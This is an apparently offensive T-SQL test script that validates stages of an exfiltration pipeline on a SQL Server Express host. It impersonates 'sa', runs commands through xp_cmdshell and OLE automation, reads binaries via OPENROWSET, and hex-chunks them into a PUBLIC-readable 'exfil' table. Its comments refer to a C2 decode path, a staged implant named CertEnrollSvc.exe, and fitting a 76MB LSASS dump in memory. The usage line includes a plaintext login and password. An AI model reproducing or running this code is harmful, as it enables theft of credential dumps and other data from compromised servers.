-- p3_test_queries.sql
-- Validate P3 exfil building blocks on IIS01 before running end-to-end.
-- Run via SSMS or sqlcmd after xpinit. Tests 6-8 in p2_test_queries.sql
-- already verified basic OPENROWSET(BULK), hex roundtrip, and small-file
-- pipeline. This script covers the gaps: binary file, chunked loop,
-- hex reassembly roundtrip, and per-chunk_idx extraction.
--
-- Prerequisite:
--   xpinit already run (sp_OA + xp_cmdshell enabled)
--   A real binary on IIS01: C:\ProgramData\CertEnrollSvc.exe (staged via xpstage-hex)
--   If no binary available, TEST P3-1 will create a synthetic one.
--
-- Usage:
--   sqlcmd -S IIS01\SQLEXPRESS -U svc_app_dev -P "D3vPortal!2025" -C -i p3_test_queries.sql

-- ================================================================
-- TEST P3-1: OPENROWSET(BULK) + full chunk loop on real binary
-- Purpose: verify the exact T-SQL that _build_exfil_insert_tsql generates
-- Expected: exfil table populated, total hex chars = 2 x file size
-- ================================================================
EXECUTE AS LOGIN='sa';
USE tempdb;

-- Create a known binary test file if CertEnrollSvc.exe not available
-- (32KB = 32768 bytes, deterministic content for SHA256 verification)
IF NOT EXISTS (SELECT 1 FROM sys.dm_exec_requests WHERE 1=0)
BEGIN
    -- Always create synthetic test file for reproducibility
    DECLARE @synth VARBINARY(MAX) = CAST(REPLICATE(CAST(0xDEADBEEF AS VARBINARY(4)), 256) AS VARBINARY(MAX));
    -- @synth = 1024 bytes; loop to 32KB
    WHILE DATALENGTH(@synth) < 32768
        SET @synth = @synth + CAST(REPLICATE(CAST(0xDEADBEEF AS VARBINARY(4)), 256) AS VARBINARY(MAX));
    SET @synth = SUBSTRING(@synth, 1, 32768);

    -- Write via ADODB.Stream
    DECLARE @sobj INT, @shr INT;
    EXEC @shr = sp_OACreate 'ADODB.Stream', @sobj OUT;
    EXEC sp_OASetProperty @sobj, 'Type', 1;
    EXEC sp_OAMethod @sobj, 'Open';
    EXEC sp_OAMethod @sobj, 'Write', NULL, @synth;
    EXEC sp_OAMethod @sobj, 'SaveToFile', NULL, 'C:\ProgramData\p3_test_binary.bin', 2;
    EXEC sp_OAMethod @sobj, 'Close';
    EXEC sp_OADestroy @sobj;
END
GO

EXECUTE AS LOGIN='sa';
USE tempdb;

-- Read the test binary
DECLARE @data VARBINARY(MAX);
SELECT @data = BulkColumn
FROM OPENROWSET(BULK 'C:\ProgramData\p3_test_binary.bin', SINGLE_BLOB) AS t;

DECLARE @total INT = DATALENGTH(@data);

PRINT '--- TEST P3-1: OPENROWSET + chunk loop on binary ---';
PRINT 'File size: ' + CAST(@total AS VARCHAR(20)) + ' bytes';

-- Use chunk_mb equivalent of 10KB to force multiple chunks on 32KB file
IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;
CREATE TABLE tempdb..exfil (
    id        INT IDENTITY(1,1),
    chunk_idx INT           NOT NULL,
    chunk     NVARCHAR(MAX) NOT NULL
);
GRANT SELECT ON tempdb..exfil TO PUBLIC;

DECLARE @cb INT = 10240;  -- 10KB chunks -> 4 chunks for 32KB file
DECLARE @i INT = 0;
WHILE @i * @cb < @total
BEGIN
    DECLARE @off INT = @i * @cb + 1;
    DECLARE @len INT = CASE
        WHEN @off + @cb - 1 > @total
        THEN @total - @off + 1
        ELSE @cb END;

    DECLARE @hex VARCHAR(MAX) = CONVERT(VARCHAR(MAX),
        SUBSTRING(@data, @off, @len), 2);

    DECLARE @j INT = 1;
    WHILE @j <= LEN(@hex)
    BEGIN
        INSERT INTO tempdb..exfil (chunk_idx, chunk)
        VALUES (@i, SUBSTRING(@hex, @j, 8000));
        SET @j = @j + 8000;
    END
    SET @i = @i + 1;
END

PRINT 'Num file-chunks: ' + CAST(@i AS VARCHAR(20));

-- Verify chunk_idx distribution
SELECT chunk_idx, COUNT(*) AS rows, SUM(LEN(chunk)) AS hex_chars
FROM tempdb..exfil GROUP BY chunk_idx ORDER BY chunk_idx;

-- Verify total hex = 2x file size
DECLARE @total_hex BIGINT;
SELECT @total_hex = SUM(CAST(LEN(chunk) AS BIGINT)) FROM tempdb..exfil;
PRINT 'Total hex chars: ' + CAST(@total_hex AS VARCHAR(20));
PRINT 'Expected (2 x file_size): ' + CAST(CAST(@total AS BIGINT) * 2 AS VARCHAR(20));
PRINT CASE WHEN @total_hex = CAST(@total AS BIGINT) * 2 THEN 'PASS' ELSE '*** FAIL ***' END;
GO

-- ================================================================
-- TEST P3-2: Per-chunk_idx hex reassembly + binary roundtrip
-- Purpose: verify that reassembling hex per chunk_idx and decoding
--          produces binary identical to original file
-- This simulates the WS01 extract (per chunk_idx) + C2 decode path
-- Expected: reassembled binary SHA256 = original file SHA256
-- ================================================================
EXECUTE AS LOGIN='sa';
USE tempdb;

PRINT '--- TEST P3-2: Per-chunk_idx hex reassembly roundtrip ---';

-- Reassemble chunk_idx=0
DECLARE @hex0 VARCHAR(MAX) = '';
SELECT @hex0 = @hex0 + CAST(chunk AS VARCHAR(MAX))
FROM tempdb..exfil WHERE chunk_idx = 0 ORDER BY id;
PRINT 'chunk_idx=0 hex length: ' + CAST(LEN(@hex0) AS VARCHAR(20));

-- Reassemble chunk_idx=1
DECLARE @hex1 VARCHAR(MAX) = '';
SELECT @hex1 = @hex1 + CAST(chunk AS VARCHAR(MAX))
FROM tempdb..exfil WHERE chunk_idx = 1 ORDER BY id;
PRINT 'chunk_idx=1 hex length: ' + CAST(LEN(@hex1) AS VARCHAR(20));

-- Concat all chunks in order and decode to binary
DECLARE @all_hex VARCHAR(MAX) = '';
DECLARE @max_ci INT;
SELECT @max_ci = MAX(chunk_idx) FROM tempdb..exfil;

DECLARE @ci INT = 0;
WHILE @ci <= @max_ci
BEGIN
    DECLARE @chunk_hex VARCHAR(MAX) = '';
    SELECT @chunk_hex = @chunk_hex + CAST(chunk AS VARCHAR(MAX))
    FROM tempdb..exfil WHERE chunk_idx = @ci ORDER BY id;
    SET @all_hex = @all_hex + @chunk_hex;
    SET @ci = @ci + 1;
END

PRINT 'Total reassembled hex length: ' + CAST(LEN(@all_hex) AS VARCHAR(20));

-- Decode hex back to binary
DECLARE @reassembled VARBINARY(MAX) = CONVERT(VARBINARY(MAX), '0x' + @all_hex, 1);
PRINT 'Reassembled binary size: ' + CAST(DATALENGTH(@reassembled) AS VARCHAR(20));

-- Write reassembled to file for SHA256 comparison
DECLARE @obj INT, @hr INT;
EXEC @hr = sp_OACreate 'ADODB.Stream', @obj OUT;
EXEC sp_OASetProperty @obj, 'Type', 1;
EXEC sp_OAMethod @obj, 'Open';
EXEC sp_OAMethod @obj, 'Write', NULL, @reassembled;
EXEC sp_OAMethod @obj, 'SaveToFile', NULL, 'C:\ProgramData\p3_test_roundtrip.bin', 2;
EXEC sp_OAMethod @obj, 'Close';
EXEC sp_OADestroy @obj;

PRINT 'Original SHA256:';
EXEC xp_cmdshell 'certutil -hashfile C:\ProgramData\p3_test_binary.bin SHA256';
PRINT 'Roundtrip SHA256:';
EXEC xp_cmdshell 'certutil -hashfile C:\ProgramData\p3_test_roundtrip.bin SHA256';
PRINT '--- SHA256 must match for PASS ---';
GO

-- ================================================================
-- TEST P3-3: OPENROWSET(BULK) on C:\ProgramData (actual dump location)
-- Purpose: verify file read from the real exfil target path
-- Expected: PASS — service account reads C:\ProgramData by default
-- ================================================================
EXECUTE AS LOGIN='sa';

PRINT '--- TEST P3-3: OPENROWSET(BULK) on C:\ProgramData ---';

-- Check SQL Server service identity
EXEC xp_cmdshell 'whoami';

DECLARE @data VARBINARY(MAX);
BEGIN TRY
    SELECT @data = BulkColumn
    FROM OPENROWSET(BULK 'C:\ProgramData\p3_test_binary.bin', SINGLE_BLOB) AS t;
    PRINT 'Bytes read: ' + CAST(DATALENGTH(@data) AS VARCHAR(20));
    PRINT 'PASS — OPENROWSET reads C:\ProgramData OK';
END TRY
BEGIN CATCH
    PRINT 'FAIL — ' + ERROR_MESSAGE();
END CATCH
GO

-- ================================================================
-- TEST P3-4: Express Edition memory check for large file
-- Purpose: estimate if 76MB LSASS dump fits in Express memory
-- Expected: informational — record peak memory during OPENROWSET
-- ================================================================
EXECUTE AS LOGIN='sa';

PRINT '--- TEST P3-4: Memory sizing for large file ---';

-- Current memory config
SELECT name, CAST(value_in_use AS VARCHAR(20)) AS value_in_use
FROM sys.configurations
WHERE name IN ('max server memory (MB)', 'min server memory (MB)');

-- Current memory usage
SELECT
    physical_memory_kb / 1024 AS physical_memory_mb,
    committed_kb / 1024 AS sql_committed_mb,
    committed_target_kb / 1024 AS sql_target_mb
FROM sys.dm_os_sys_info;

-- Buffer pool usage
SELECT
    COUNT(*) * 8 / 1024 AS buffer_pool_mb,
    SUM(CASE WHEN is_modified = 1 THEN 1 ELSE 0 END) * 8 / 1024 AS dirty_pages_mb
FROM sys.dm_os_buffer_descriptors;

PRINT 'Rule of thumb: OPENROWSET peak memory ~= file_size + 2*chunk_hex + INSERT buffer';
PRINT 'For 76MB dump: ~76 + 2*20 + overhead ~= 130MB (within Express 1GB/1.4GB limit)';
GO

-- ================================================================
-- TEST P3-5: Large binary INSERT performance (if binary available)
-- Purpose: benchmark T-SQL INSERT loop on a real payload
-- Expected: completion time + row count
-- NOTE: skip if no large binary on IIS01, or use CertEnrollSvc.exe
-- ================================================================
EXECUTE AS LOGIN='sa';
USE tempdb;

PRINT '--- TEST P3-5: INSERT performance on real binary ---';

-- Attempt with CertEnrollSvc.exe (exists if xpstage-hex was run)
DECLARE @data VARBINARY(MAX);
BEGIN TRY
    SELECT @data = BulkColumn
    FROM OPENROWSET(BULK 'C:\ProgramData\CertEnrollSvc.exe', SINGLE_BLOB) AS t;

    DECLARE @total INT = DATALENGTH(@data);
    PRINT 'File size: ' + CAST(@total AS VARCHAR(20)) + ' bytes';

    DECLARE @start DATETIME = GETDATE();

    IF OBJECT_ID('tempdb..exfil_perf','U') IS NOT NULL DROP TABLE tempdb..exfil_perf;
    CREATE TABLE tempdb..exfil_perf (
        id INT IDENTITY(1,1), chunk_idx INT NOT NULL, chunk NVARCHAR(MAX) NOT NULL);

    DECLARE @cb INT = 10485760;  -- 10MB chunks (production default)
    DECLARE @i INT = 0;
    WHILE @i * @cb < @total
    BEGIN
        DECLARE @off INT = @i * @cb + 1;
        DECLARE @len INT = CASE
            WHEN @off + @cb - 1 > @total THEN @total - @off + 1
            ELSE @cb END;
        DECLARE @hex VARCHAR(MAX) = CONVERT(VARCHAR(MAX),
            SUBSTRING(@data, @off, @len), 2);
        DECLARE @j INT = 1;
        WHILE @j <= LEN(@hex)
        BEGIN
            INSERT INTO tempdb..exfil_perf(chunk_idx, chunk)
            VALUES (@i, SUBSTRING(@hex, @j, 8000));
            SET @j = @j + 8000;
        END
        SET @i = @i + 1;
    END

    DECLARE @elapsed INT = DATEDIFF(SECOND, @start, GETDATE());
    DECLARE @rows INT;
    SELECT @rows = COUNT(*) FROM tempdb..exfil_perf;

    PRINT 'Chunks: ' + CAST(@i AS VARCHAR(20));
    PRINT 'Total rows: ' + CAST(@rows AS VARCHAR(20));
    PRINT 'Elapsed: ' + CAST(@elapsed AS VARCHAR(20)) + ' seconds';
    PRINT 'PASS — performance benchmark recorded';

    DROP TABLE tempdb..exfil_perf;
END TRY
BEGIN CATCH
    PRINT 'SKIP — CertEnrollSvc.exe not found (run xpstage-hex first)';
    PRINT ERROR_MESSAGE();
END CATCH
GO

-- ================================================================
-- Cleanup
-- ================================================================
EXECUTE AS LOGIN='sa';
EXEC xp_cmdshell 'del /f C:\ProgramData\p3_test_binary.bin 2>nul';
EXEC xp_cmdshell 'del /f C:\ProgramData\p3_test_roundtrip.bin 2>nul';
IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;
PRINT '--- Cleanup done ---';
GO

-- ================================================================
-- SUMMARY
-- ================================================================
-- TEST P3-1: OPENROWSET + chunk loop on binary        -> core INSERT pipeline
-- TEST P3-2: Per-chunk_idx hex reassembly roundtrip   -> WS01 extract + C2 decode
--            SHA256 must match original               -> binary integrity
-- TEST P3-3: OPENROWSET on C:\ProgramData              -> actual dump location
-- TEST P3-4: Express memory sizing                    -> capacity check
-- TEST P3-5: INSERT performance on real binary        -> benchmark
--
-- Prerequisites from p2_test_queries.sql (run first if not done):
--   TEST 6: hex encode/decode roundtrip
--   TEST 7: OPENROWSET(BULK) basic read
--   TEST 8: small-file pipeline
--
-- If TEST P3-1 FAILS:
--   -> check OPENROWSET permission (sa should have ADMINISTER BULK OPERATIONS)
--   -> check file exists and SQL service account can read it
--
-- If TEST P3-2 SHA256 MISMATCH:
--   -> hex encoding or chunk boundary is wrong
--   -> check CONVERT style 2 output for unexpected prefix/suffix
--
-- If TEST P3-3 FAILS:
--   -> check ACL: icacls C:\ProgramData
--   -> SQL service account should have read access by default
